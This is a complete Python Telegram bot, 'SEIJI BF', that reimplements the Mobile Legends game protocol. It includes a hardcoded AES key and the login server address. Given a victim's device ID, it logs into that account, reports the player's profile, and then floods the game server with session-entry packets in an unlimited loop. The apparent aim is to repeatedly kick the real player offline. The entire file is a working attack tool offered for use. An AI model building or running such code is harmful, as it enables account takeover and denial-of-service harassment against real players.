# bot.py
# python 3.11+  ·  python-telegram-bot 20.7
# run local:   python bot.py                  (polling)
# run render:  python bot.py                  (webhook, RENDER_EXTERNAL_URL auto-detected)

import asyncio
import logging
import os
import re
import socket
import struct
import sys
import threading
import time as _time
import zlib
from enum import Enum

try:
    import zstandard as zstd
    import urllib3
    from Crypto.Cipher import AES
    from dotenv import load_dotenv
    from telegram import Update
    from telegram.constants import ParseMode
    from telegram.ext import (
        Application,
        CommandHandler,
        ContextTypes,
        MessageHandler,
        filters,
    )
except ImportError as e:
    sys.stderr.write(f"\n  missing dependency: {e.name}\n"
                     f"  pip install -r requirements.txt\n\n")
    sys.exit(1)

load_dotenv()
urllib3.disable_warnings()


# ══════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
if not TOKEN:
    sys.stderr.write("TELEGRAM_BOT_TOKEN is required\n")
    sys.exit(1)

ADMIN_IDS = [
    int(x.strip())
    for x in os.environ.get("ADMIN_IDS", "").split(",")
    if x.strip().lstrip("-").isdigit()
]

PORT = int(os.environ.get("PORT", "8080"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "").strip()
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").strip()

# Render injects RENDER_EXTERNAL_URL automatically
if not WEBHOOK_URL and RENDER_EXTERNAL_URL:
    WEBHOOK_URL = RENDER_EXTERNAL_URL.rstrip("/")


# ══════════════════════════════════════════════════════════════════
#  MLBB CONSTANTS
# ══════════════════════════════════════════════════════════════════
AES_KEY = bytes.fromhex("f5a193d50ade553e9835595f5cd75ddd")
AES_IV = b"\x00" * 16
LOGIN_HOST = "login.ml.youngjoygame.com"
LOGIN_PORT = 30021
CLIENT_VERSION = "2.2.16.1232.1"
CHANNEL = "and_usa"
SOCKET_TIMEOUT = 3

DEVICE_ID_STRICT = re.compile(
    r'(?:and_|ios_)[0-9A-Za-z]{56}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
    r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
)


logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
for n in ("httpx", "telegram", "telegram.ext", "tornado", "apscheduler"):
    logging.getLogger(n).setLevel(logging.WARNING)
log = logging.getLogger("seiji-bf")

active_bruteforces = {}


# ══════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════
def esc(s):
    return (str(s).replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;"))


def is_admin(uid):
    if not ADMIN_IDS:
        return True
    return uid in ADMIN_IDS


def fmt_uptime(sec):
    sec = int(sec)
    if sec < 60:
        return f"{sec}s"
    m, s = divmod(sec, 60)
    if m < 60:
        return f"{m}m{s}s"
    h, m = divmod(m, 60)
    return f"{h}h{m}m"


# ══════════════════════════════════════════════════════════════════
#  SDP ENVELOPE
# ══════════════════════════════════════════════════════════════════
class SdpType(Enum):
    INT_POS = 0
    INT_NEG = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8


class SdpError(Exception):
    pass


def _sdp_sort_key(kv):
    k = kv[0]
    return (0, k) if isinstance(k, int) else (1, str(k))


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b""
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items(), key=_sdp_sort_key):
            self._pack(tag, value)
        self.data += bytes([SdpType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpType) and value == SdpType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, v):
        r = bytearray()
        while v >= 0x80:
            r.append((v & 0x7F) | 0x80)
            v >>= 7
        r.append(v & 0x7F)
        return bytes(r)

    def _read_number(self):
        if self.offset >= len(self.data):
            raise SdpError("varint eof")
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data):
                raise SdpError("varint truncated")
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, dtype):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpType.INT_POS)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpType.INT_NEG)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpType.INT_POS)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpType.DOUBLE)
            p = struct.pack("<d", value)
            self.data += self._write_number(len(p)) + p
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpType.STRING)
            e = value.encode("utf-8") if isinstance(value, str) else value
            self.data += self._write_number(len(e)) + e
        elif isinstance(value, list):
            self._pack_header(tag, SdpType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpType.STRUCT_BEGIN)
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(k, v)
                self.data += bytes([SdpType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items(), key=_sdp_sort_key):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpError(f"unsupported type {type(value)}")

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            h = self.data[self.offset]
            tag = h & 0xF
            dtype = SdpType(h >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if dtype == SdpType.INT_POS:
                return tag, self._read_number()
            if dtype == SdpType.INT_NEG:
                return tag, -self._read_number()
            if dtype == SdpType.FLOAT:
                raw = self._read_number().to_bytes(4, "little")
                return tag, struct.unpack("<f", raw)[0]
            if dtype == SdpType.DOUBLE:
                raw = self._read_number().to_bytes(8, "little")
                return tag, struct.unpack("<d", raw)[0]
            if dtype == SdpType.STRING:
                l = self._read_number()
                chunk = self.data[self.offset:self.offset + l]
                try:
                    val = chunk.decode("utf-8")
                except UnicodeDecodeError:
                    val = chunk
                self.offset += l
                return tag, val
            if dtype == SdpType.LIST:
                l = self._read_number()
                val = [self._unpack()[1] for _ in range(l)]
                return tag, val
            if dtype == SdpType.DICT:
                l = self._read_number()
                val = {}
                for _ in range(l):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    val[k] = v
                return tag, val
            if dtype == SdpType.STRUCT_BEGIN:
                sub = {}
                while True:
                    st, sv = self._unpack()
                    if isinstance(sv, SdpType) and sv == SdpType.STRUCT_END:
                        break
                    sub[st] = sv
                return tag, SdpStruct(sub)
            if dtype == SdpType.STRUCT_END:
                return tag, SdpType.STRUCT_END
            raise SdpError("bad data type")
        except SdpError:
            raise
        except Exception:
            raise SdpError("unpack failed")


def _aes_decrypt(data):
    if not data or len(data) % 16:
        raise SdpError("bad cipher length")
    return AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV).decrypt(data).rstrip(b"\x00")


def map_rank(p):
    try:
        p = int(p)
    except (TypeError, ValueError):
        return "Unranked"
    if p <= 0:
        return "Unranked"
    table = [
        (0, 4, "Warrior III"), (5, 9, "Warrior II"), (10, 14, "Warrior I"),
        (15, 19, "Elite IV"), (20, 24, "Elite III"), (25, 29, "Elite II"),
        (30, 34, "Elite I"),
        (35, 39, "Master IV"), (40, 44, "Master III"), (45, 49, "Master II"),
        (50, 54, "Master I"),
        (55, 59, "Grandmaster IV"), (60, 64, "Grandmaster III"),
        (65, 69, "Grandmaster II"), (70, 74, "Grandmaster I"),
        (75, 81, "Epic IV"), (82, 88, "Epic III"), (89, 95, "Epic II"),
        (96, 107, "Epic I"),
        (108, 114, "Legend IV"), (115, 121, "Legend III"),
        (122, 128, "Legend II"), (129, 135, "Legend I"),
    ]
    for lo, hi, name in table:
        if lo <= p <= hi:
            return name
    if 136 <= p <= 160:
        return f"Mythic {p - 135}"
    if 161 <= p <= 195:
        return f"Mythical Honor {p - 135}"
    if 196 <= p <= 235:
        return f"Mythical Glory {p - 195}"
    if p >= 236:
        return f"Mythical Immortal {p - 235}"
    return "Unranked"


# ══════════════════════════════════════════════════════════════════
#  GAME CONNECTION
# ══════════════════════════════════════════════════════════════════
class GameConn:
    def __init__(self, device_id):
        self.device_id = device_id
        self.host = LOGIN_HOST
        self.port = LOGIN_PORT
        self.sequence = 1
        self.socket = None
        self.queue = b""
        parts = device_id.split("_")
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info = info + "_" + parts[2]
            if len(info) >= 32:
                self.imei_md5 = info[:32]
                self.android_id = info[32:48] if len(info) >= 48 else ""
                self.advertising_id = info[48:] if len(info) > 48 else ""
            else:
                self.imei_md5 = info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""
        self.account_id = 0
        self.session_key = ""
        self.zone_id = 0
        self.game_host = ""
        self.game_port = 0
        self.creation_ts = 0

    def connect(self, host=None, port=None):
        if host:
            self.host = host
        if port:
            self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(SOCKET_TIMEOUT)
        self.socket.connect((self.host, self.port))

    def close(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        self.socket = None
        self.sequence = 1
        self.queue = b""

    def send(self, pid, sdp):
        packet = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        size = len(buf) + 4
        if size > 0xFFFFFF:
            raise SdpError("packet too large")
        flags = size | (16 << 24)
        self.socket.send(flags.to_bytes(4, "big") + buf)
        self.sequence += 1

    def recv(self):
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], "big")
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d:
                    return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1:
                data = zlib.decompress(data)
            elif ctype == 16:
                data = zstd.decompress(data)
            elif ctype == 2:
                data = _aes_decrypt(data)
            elif ctype == 3:
                data = zlib.decompress(_aes_decrypt(data))
            elif ctype == 18:
                data = zstd.decompress(_aes_decrypt(data))
            result = SdpStruct(data)
            pid = result[0]
            if pid is None:
                return None, None
            body = result.get(6)
            if not isinstance(body, bytes):
                body = result.get(5)
                if not isinstance(body, bytes):
                    return pid, None
            return pid, SdpStruct(body)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None

    def login(self):
        self.connect(LOGIN_HOST, LOGIN_PORT)
        self.send(1, SdpStruct({
            0: self.device_id,
            1: (f"gps_adid={self.advertising_id}&android_id={self.android_id}"
                f"&device_unique_id={self.imei_md5}"),
            2: CLIENT_VERSION,
            3: CHANNEL,
            4: "en",
        }))
        pid, res = self.recv()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            zd = res.get(2)
            if isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else:
                self.zone_id = zd or 0
            self.creation_ts = res.get(19, 0)
            return True, res
        return False, res

    def get_server(self):
        self.send(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION,
            5: self.zone_id, 6: CHANNEL,
        }))
        pid, res = self.recv()
        if pid == 6 and res:
            addr = res[1]
            self.game_host, ps = addr.split(":")
            self.game_port = int(ps)
            return True, res
        return False, res

    def enter_game(self):
        self.close()
        self.connect(self.game_host, self.game_port)
        self.send(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id,
        }))
        self.send(10101, SdpStruct({0: 0, 2: 2}))

    def handshake(self, tries=25):
        for _ in range(tries):
            pid, _ = self.recv()
            if pid is None or pid == -1:
                return False
            if pid == 10002:
                return True
        return False

    def lookup(self, value, kind="id"):
        if kind == "id":
            try:
                payload = SdpStruct({1: int(value)})
            except (TypeError, ValueError):
                return None
        else:
            payload = SdpStruct({0: str(value).strip()})
        self.send(11153, payload)
        miss = 0
        while True:
            pid, res = self.recv()
            if pid is None or pid == -1:
                return None
            if pid == 11154:
                return res
            if pid == 20001:
                miss += 1
                if miss >= 2:
                    return None


# ══════════════════════════════════════════════════════════════════
#  BRUTEFORCE CORE
# ══════════════════════════════════════════════════════════════════
def bf_fetch_profile(device_id):
    conn = GameConn(device_id)
    try:
        ok, _ = conn.login()
        if not ok:
            return None
        ok2, _ = conn.get_server()
        if not ok2:
            return None
        profile = {
            "device_id": device_id,
            "account_id": conn.account_id,
            "session_key": conn.session_key,
            "zone_id": conn.zone_id,
            "game_host": conn.game_host,
            "game_port": conn.game_port,
            "nickname": f"Player_{conn.account_id}",
            "level": 0,
            "rank": "Unknown",
            "skin_count": 0,
            "hero_count": 0,
        }
        try:
            conn.enter_game()
            if conn.handshake():
                result = conn.lookup(int(conn.account_id), "id")
                if result:
                    p = result[0][0] if (result.get(0) and len(result[0]) > 0) else {}
                    if isinstance(p, dict):
                        profile["nickname"] = p.get(2) or profile["nickname"]
                        profile["level"] = p.get(3, 0) or 0
                        profile["rank"] = map_rank(p.get(8, 0))
                        profile["skin_count"] = p.get(83, 0) or 0
                        profile["hero_count"] = p.get(4, 0) or 0
        except Exception:
            pass
        return profile
    except Exception as e:
        log.error("bf_fetch_profile: %s", e)
        return None
    finally:
        conn.close()


def bf_send_kick(profile, timeout=2.0, stop_event=None):
    t0 = _time.time()
    if stop_event is not None and stop_event.is_set():
        return False, 0.0, "STOPPED"
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile["game_host"], profile["game_port"]))

        if stop_event is not None and stop_event.is_set():
            try:
                sock.close()
            except Exception:
                pass
            return False, (_time.time() - t0) * 1000, "STOPPED"

        body_struct = SdpStruct({
            0: profile["account_id"],
            1: profile["session_key"],
            2: profile["zone_id"],
            4: CLIENT_VERSION,
            13: CHANNEL,
            15: profile["device_id"],
        }).data

        pkt = SdpStruct({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.send(flags.to_bytes(4, "big") + comp)

        q = b""
        got_ack = False
        while len(q) < 4:
            if stop_event is not None and stop_event.is_set():
                try:
                    sock.close()
                except Exception:
                    pass
                return False, (_time.time() - t0) * 1000, "STOPPED"
            try:
                d = sock.recv(4096)
            except socket.timeout:
                break
            if not d:
                break
            q += d
        if len(q) >= 4:
            fl = int.from_bytes(q[:4], "big")
            sz = fl & 0xFFFFFF
            while len(q) < sz:
                if stop_event is not None and stop_event.is_set():
                    try:
                        sock.close()
                    except Exception:
                        pass
                    return False, (_time.time() - t0) * 1000, "STOPPED"
                try:
                    d = sock.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                q += d
            if len(q) >= sz:
                got_ack = True

        elapsed = (_time.time() - t0) * 1000
        try:
            sock.close()
        except Exception:
            pass
        return True, elapsed, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return False, (_time.time() - t0) * 1000, "TIMEOUT"
    except Exception as e:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return False, (_time.time() - t0) * 1000, str(e)


async def bf_worker(uid, profile, device_id, total_loops, delay_sec,
                    stop_event, bot, chat_id):
    stats = active_bruteforces[uid]["stats"]
    loop = asyncio.get_running_loop()

    def _blocking_loop():
        while not stop_event.is_set():
            if total_loops > 0 and stats["count"] >= total_loops:
                break
            stats["count"] += 1
            ok, lat, status = bf_send_kick(profile, stop_event=stop_event)
            if status == "STOPPED":
                break
            if ok:
                stats["ok"] += 1
            else:
                stats["fail"] += 1
            log.info("loop=%d ok=%d fail=%d last=%.0fms %s",
                     stats["count"], stats["ok"], stats["fail"], lat, status)
            if stop_event.is_set():
                break
            if delay_sec > 0:
                if stop_event.wait(delay_sec):
                    break

    try:
        await loop.run_in_executor(None, _blocking_loop)
    except Exception as e:
        log.error("bf_worker: %s", e)

    duration = _time.time() - active_bruteforces.get(uid, {}).get(
        "started", _time.time())
    stopped = stop_event.is_set()
    header = ("🔴 <b>Bruteforce Stopped</b>" if stopped
              else "⚡ <b>Bruteforce Finished</b>")
    summary = (
        f"{header}\n"
        f"─────────────────────\n"
        f"🎯 Target: <code>{esc(profile.get('nickname', '?'))}</code>\n"
        f"🆔 Acc ID: <code>{profile['account_id']}</code>\n"
        f"⏱️ Duration: <code>{duration:.1f}s</code>\n"
        f"🔁 Attempts: <code>{stats['count']}</code>\n"
        f"✅ OK: <code>{stats['ok']}</code>\n"
        f"❌ Fail: <code>{stats['fail']}</code>\n"
        f"─────────────────────"
    )
    try:
        await bot.send_message(chat_id=chat_id, text=summary,
                               parse_mode=ParseMode.HTML)
    except Exception as e:
        log.error("summary send: %s", e)
    active_bruteforces.pop(uid, None)


# ══════════════════════════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════════════════════════
WELCOME = (
    "⚡ <b>SEIJI BF</b>\n\n"
    "Bruteforce device id tool.\n\n"
    "<b>Commands</b>\n"
    "<code>/bf</code> — start a bruteforce\n"
    "<code>/bfstatus</code> — show running job\n"
    "<code>/stop</code> — stop running job\n"
    "<code>/id</code> — your telegram id\n"
    "<code>/help</code> — this message"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ not authorized")
        return
    await update.message.reply_text(WELCOME, parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_start(update, ctx)


async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<code>{update.effective_user.id}</code>",
        parse_mode=ParseMode.HTML,
    )


async def cmd_bf(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ not authorized")
        return
    if uid in active_bruteforces:
        await update.message.reply_text(
            "⚠️ bruteforce already running. use /stop first."
        )
        return
    ctx.user_data.clear()
    ctx.user_data["awaiting_bf_device"] = True
    await update.message.reply_text(
        "⚡ <b>Bruteforce</b>\n\nSend the device id:",
        parse_mode=ParseMode.HTML,
    )


async def cmd_bfstatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active_bruteforces:
        await update.message.reply_text("⚡ no active bruteforce.")
        return
    bf = active_bruteforces[uid]
    stats = bf["stats"]
    profile = bf["profile"]
    total = stats.get("total", 0)
    loop_str = (f"{stats['count']}/{total}" if total > 0
                else f"{stats['count']}/∞")
    elapsed = int(_time.time() - bf["started"])
    msg = (
        f"⚡ <b>ACTIVE</b>\n"
        f"─────────────────────\n"
        f"🎯 Target: <code>{esc(profile.get('nickname', '?'))}</code>\n"
        f"🆔 Acc ID: <code>{profile['account_id']}</code>\n"
        f"🌐 Zone: <code>{profile['zone_id']}</code>\n"
        f"🖥️ Server: <code>{profile['game_host']}:{profile['game_port']}</code>\n"
        f"🔁 Loops: <code>{loop_str}</code>\n"
        f"✅ OK: <code>{stats['ok']}</code>\n"
        f"❌ Fail: <code>{stats['fail']}</code>\n"
        f"⏱️ Delay: <code>{bf.get('delay', 0)}s</code>\n"
        f"⌛ Elapsed: <code>{fmt_uptime(elapsed)}</code>\n"
        f"─────────────────────"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active_bruteforces:
        await update.message.reply_text("⚡ no active bruteforce.")
        return
    active_bruteforces[uid]["stop"].set()
    await update.message.reply_text("🔴 stopping...")


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    text = (update.message.text or "").strip()
    if not text:
        return

    # step 1: device id
    if ctx.user_data.get("awaiting_bf_device"):
        ctx.user_data["awaiting_bf_device"] = False
        if not DEVICE_ID_STRICT.fullmatch(text):
            await update.message.reply_text("❌ invalid device id format.")
            return
        status = await update.message.reply_text("⏳ resolving target...")
        try:
            loop = asyncio.get_running_loop()
            profile = await loop.run_in_executor(None, bf_fetch_profile, text)
        except Exception as e:
            log.error("fetch: %s", e)
            profile = None
        if not profile:
            await status.edit_text("❌ login failed — device id dead or rejected.")
            return
        ctx.user_data["bf_device_id"] = text
        ctx.user_data["bf_profile"] = profile
        ctx.user_data["awaiting_bf_loops"] = True
        await status.edit_text(
            f"✅ <b>Target verified</b>\n"
            f"├ IGN: <code>{esc(profile.get('nickname', '?'))}</code>\n"
            f"├ Acc ID: <code>{profile['account_id']}</code>\n"
            f"├ Zone ID: <code>{profile['zone_id']}</code>\n"
            f"├ Level: <code>{profile.get('level', 0)}</code>\n"
            f"├ Rank: <code>{esc(profile.get('rank', '?'))}</code>\n"
            f"└ Server: <code>{profile['game_host']}:{profile['game_port']}</code>\n\n"
            f"Send loop count (0 = unlimited, default 10):",
            parse_mode=ParseMode.HTML,
        )
        return

    # step 2: loop count
    if ctx.user_data.get("awaiting_bf_loops"):
        ctx.user_data["awaiting_bf_loops"] = False
        try:
            loops = int(text) if text else 10
        except ValueError:
            loops = 10
        if loops < 0:
            loops = 0
        ctx.user_data["bf_loops"] = loops
        ctx.user_data["awaiting_bf_delay"] = True
        await update.message.reply_text("Send delay in seconds (default 2.0):")
        return

    # step 3: delay + start
    if ctx.user_data.get("awaiting_bf_delay"):
        ctx.user_data["awaiting_bf_delay"] = False
        try:
            delay = float(text) if text else 2.0
        except ValueError:
            delay = 2.0
        if delay < 0:
            delay = 0.0

        device_id = ctx.user_data.pop("bf_device_id", None)
        profile = ctx.user_data.pop("bf_profile", None)
        loops = ctx.user_data.pop("bf_loops", 10)
        if not device_id or not profile:
            await update.message.reply_text("❌ session lost. use /bf again.")
            return

        if uid in active_bruteforces:
            active_bruteforces[uid]["stop"].set()
            await asyncio.sleep(0.2)

        stop_event = threading.Event()
        stats = {"count": 0, "ok": 0, "fail": 0, "total": loops}
        active_bruteforces[uid] = {
            "stop": stop_event,
            "stats": stats,
            "profile": profile,
            "device_id": device_id,
            "started": _time.time(),
            "delay": delay,
        }

        loop_str = f"{loops:,} loops" if loops > 0 else "unlimited"
        await update.message.reply_text(
            f"⚡ <b>Bruteforce started</b>\n"
            f"├ Target: <code>{esc(profile.get('nickname', '?'))}</code>\n"
            f"├ Loops: <code>{loop_str}</code>\n"
            f"├ Delay: <code>{delay}s</code>\n"
            f"└ Monitor: /bfstatus  ·  Stop: /stop",
            parse_mode=ParseMode.HTML,
        )

        asyncio.create_task(bf_worker(
            uid, profile, device_id, loops, delay,
            stop_event, ctx.bot, update.effective_chat.id,
        ))
        return


async def on_error(update, ctx):
    log.error("handler: %s", ctx.error, exc_info=ctx.error)


# ══════════════════════════════════════════════════════════════════
#  ENTRYPOINT
# ══════════════════════════════════════════════════════════════════
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("bf", cmd_bf))
    app.add_handler(CommandHandler("bfstatus", cmd_bfstatus))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)

    if WEBHOOK_URL:
        url_path = TOKEN
        webhook_full = f"{WEBHOOK_URL.rstrip('/')}/{url_path}"
        log.info("webhook mode · url=%s · port=%d", webhook_full, PORT)
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=url_path,
            webhook_url=webhook_full,
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
        )
    else:
        log.info("polling mode · no WEBHOOK_URL or RENDER_EXTERNAL_URL set")
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
        )


if __name__ == "__main__":
    main()
